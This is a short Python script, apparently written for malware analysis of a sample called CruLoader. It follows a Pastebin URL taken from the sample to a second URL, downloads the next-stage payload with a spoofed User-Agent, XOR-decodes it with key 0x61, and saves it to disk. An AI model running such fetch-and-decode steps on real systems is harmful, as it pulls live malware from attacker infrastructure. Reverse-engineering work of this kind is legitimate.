#!/usr/bin/env python3

#Todo brute XOR instead of static hex value
#Todo 2 trim de-XOR:ed MZ file

import requests
import malduck

#URL found in CruLoader sample
url = 'https://pastebin.com/raw/mLem9DGk'

#Change the User-Agent to look less suspicius
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36'
}

r = requests.get(f'{url}', headers=headers)

first_response = r.content.decode('utf-8')

#Parse the data from the Pastebin webpage and send a new request
new_url = first_response
n = requests.get(f'{new_url}', headers=headers)
payload = n.content

# De-XOR payload
key = 0x61
payload = payload
decrypted = malduck.xor(key, payload)

# Write payload to disk
with open ("payload.bin", 'wb') as o:
	o.write(decrypted)
